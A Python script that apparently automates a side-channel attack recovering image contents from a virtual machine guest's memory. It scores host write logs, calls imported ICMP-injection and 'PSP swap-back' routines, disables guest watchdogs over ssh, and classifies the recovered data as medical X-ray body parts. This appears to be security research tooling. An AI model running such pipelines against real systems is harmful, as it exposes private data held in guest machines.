#!/usr/bin/env python3
"""
mura_auto_xor_pipeline.py -- bulk automation: write-tracker candidates (many
host logs) -> mura_dict_build.py's infer() (real content extraction) ->
XorSliceSENet classification, in one pass. Produces many xor_slice.npy
files + one summary CSV instead of doing this one candidate at a time.

Reuses existing pieces as-is (no reimplementation):
  - mura_dict_build.build()/infer() for the ICMP dictionary + swap-back reads
  - mura_block_triage.load_candidates() for MURA-logic candidate scoring
    (score = hits * max_run, MIN_RUN=2, GAP_TOL=2, Region A/B excluded)
  - mura_classify_xor_slice.XorSliceSENet for the trained body-part classifier

Skips rank 1-2 per log by default (--skip-top): those addresses have shown
up repeatedly this session as non-target kernel-noise blocks (the
0x120800000 / 0xc0000000-style ones), not real image content.

sudo required -- mura_dict_build.py's build()/infer() need ICMP injection
and PSP swap-back, both root-only.

Usage:
  sudo python3 mura_auto_xor_pipeline.py --host-log "mura_host_regB_*.log" \
      --top-n 5 --skip-top 2 --out-csv mura_auto_pipeline_results.csv
"""
import argparse
import csv
import glob
import sys
from pathlib import Path

import numpy as np
import torch
import torch.nn.functional as F

sys.path.insert(0, str(Path(__file__).parent))
from mura_dict_build import (  # noqa: E402
    DICT_CACHE, SWAP_TOOL, build, infer, ssh, ensure_mtu_9000,
)
from mura_block_triage import load_candidates  # noqa: E402
from mura_classify_xor_slice import XorSliceSENet, CLASSES, CKPT_DEFAULT  # noqa: E402

OUT_DIR = Path(__file__).parent / "xor_slices_auto"

# Blocks observed repeatedly across MANY different MURA class logs this
# session that are NEVER the real image -- kernel/driver noise, not content.
# 0x120800000 / 0xc0000000: max_run capped ~16p (seen across MNIST too).
# 0x3ce6600000: max_run capped 2p, showed up as the #1-ranked candidate in
# nearly every class log (ELBOW/FINGER/FOREARM/HAND/HUMERUS/SHOULDER).
# --skip-top alone is NOT sufficient to avoid these -- it skips by rank
# POSITION, but a noise block's exact rank varies per log (confirmed
# 2026-08-25: 0x3ce6600000 landed at rank 4 in one ELBOW log, well past
# --skip-top 2, and produced a real-but-useless-looking 0.00% match rate
# result that could be mistaken for a normalize/dictionary bug instead of
# what it actually was -- scanning the wrong block entirely).
KNOWN_NOISE_BLOCKS = {0x120800000, 0xc0000000, 0x3ce6600000}


def guest_preamble() -> None:
    """Same watchdog/THP suppression mura_dict_build.py's main() does --
    matters more here since this runs many infer() calls back to back."""
    ssh(
        "echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/printk_ratelimit > /dev/null 2>&1",
        timeout=30,
    )
    ensure_mtu_9000()


def ensure_dict(swap_tool: str) -> None:
    if DICT_CACHE.exists():
        print(f"[dict] {DICT_CACHE} already exists, skipping build")
        return
    print(f"[dict] {DICT_CACHE} not found -- building (64 refs, this takes a while)...")
    build(swap_tool)


def load_model(ckpt: str, device: torch.device) -> XorSliceSENet:
    model = XorSliceSENet(len(CLASSES), n_ref=64).to(device)
    model.load_state_dict(torch.load(ckpt, map_location=device, weights_only=True))
    model.eval()
    return model


def classify(model: XorSliceSENet, xor_slice: np.ndarray, aspect: float,
             device: torch.device) -> tuple[str, float, list[float]]:
    x  = torch.from_numpy(xor_slice).float().unsqueeze(0).to(device)
    sc = torch.tensor([[aspect]], dtype=torch.float32).to(device)
    with torch.no_grad():
        probs = F.softmax(model(x, sc), dim=1)[0].cpu().numpy()
    pred = int(probs.argmax())
    return CLASSES[pred], float(probs[pred]), probs.tolist()


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host-log", required=True,
                     help="glob pattern for host WRITE logs, e.g. 'mura_host_regB_*.log'")
    ap.add_argument("--top-n", type=int, default=5,
                     help="candidates per log to attempt after --skip-top (default 5)")
    ap.add_argument("--skip-top", type=int, default=2,
                     help="skip this many top-ranked candidates per log -- rank 1-2 are "
                          "known non-target kernel-noise blocks observed repeatedly "
                          "across MURA/MNIST this session (default 2)")
    ap.add_argument("--swap-tool", default=str(SWAP_TOOL))
    ap.add_argument("--ckpt", default=CKPT_DEFAULT)
    ap.add_argument("--aspect", type=float, default=1.0,
                     help="orig_h/orig_w scalar fed to the classifier (default 1.0, "
                          "not measured -- see mura_classify_xor_slice.py)")
    ap.add_argument("--out-csv", default="mura_auto_pipeline_results.csv")
    ap.add_argument("--out-dir", default=str(OUT_DIR))
    args = ap.parse_args()

    logs = sorted(glob.glob(args.host_log))
    if not logs:
        print(f"[!] no logs matched {args.host_log!r}", file=sys.stderr)
        sys.exit(1)
    print(f"[pipeline] {len(logs)} host log(s) matched: "
          f"{logs[0]} .. {logs[-1]}" if len(logs) > 1 else f"[pipeline] 1 host log: {logs[0]}")

    guest_preamble()
    ensure_dict(args.swap_tool)

    out_dir = Path(args.out_dir)
    out_dir.mkdir(exist_ok=True)

    device = torch.device("cpu")
    print(f"[pipeline] loading classifier from {args.ckpt} ...")
    model = load_model(args.ckpt, device)

    fields = (["log", "rank", "block_gpa", "hits", "max_run", "best_range_base",
               "best_range_len", "npy_path", "status", "pred_class", "pred_prob"]
              + [f"dist_{c}" for c in CLASSES])
    rows: list[dict] = []

    def flush_csv():
        with open(args.out_csv, "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=fields)
            w.writeheader()
            w.writerows(rows)

    for log_path in logs:
        log_stem = Path(log_path).stem
        print(f"\n[pipeline] === {log_path} ===")
        try:
            ranked = load_candidates(log_path)
        except Exception as e:
            print(f"  [!] load_candidates failed: {e}", file=sys.stderr)
            continue
        n_before = len(ranked)
        ranked = [(b, info) for b, info in ranked if b not in KNOWN_NOISE_BLOCKS]
        n_noise = n_before - len(ranked)
        print(f"  {n_before} candidates total ({n_noise} known-noise blocks filtered out), "
              f"skipping top {args.skip_top}, attempting next {args.top_n}")

        window = ranked[args.skip_top: args.skip_top + args.top_n]
        for offset, (block, info) in enumerate(window):
            rank = args.skip_top + offset + 1
            base, length = info["best_range"]
            npy_path = out_dir / f"xor_slice_{log_stem}_rank{rank}.npy"
            row = {
                "log": log_stem, "rank": rank, "block_gpa": hex(block),
                "hits": info["hits"], "max_run": info["max_run"],
                "best_range_base": hex(base), "best_range_len": length,
                "npy_path": str(npy_path), "status": "", "pred_class": "",
                "pred_prob": "", **{f"dist_{c}": "" for c in CLASSES},
            }
            print(f"  [rank {rank}] block=0x{block:x} best_range=(0x{base:x}, {length}p) "
                  f"-> infer ...")
            try:
                infer(base, args.swap_tool, npy_path)
                xor_slice = np.load(npy_path)
                pred_class, pred_prob, dist = classify(model, xor_slice, args.aspect, device)
                row["status"]     = "ok"
                row["pred_class"] = pred_class
                row["pred_prob"]  = f"{pred_prob:.4f}"
                for c, p in zip(CLASSES, dist):
                    row[f"dist_{c}"] = f"{p:.4f}"
                print(f"    -> {pred_class}  (p={pred_prob:.3f})")
            except Exception as e:
                row["status"] = f"failed: {e}"
                print(f"    [!] failed: {e}", file=sys.stderr)

            rows.append(row)
            flush_csv()

    n_ok = sum(1 for r in rows if r["status"] == "ok")
    print(f"\n[pipeline] done. {n_ok}/{len(rows)} candidates succeeded -> {args.out_csv}")


if __name__ == "__main__":
    main()
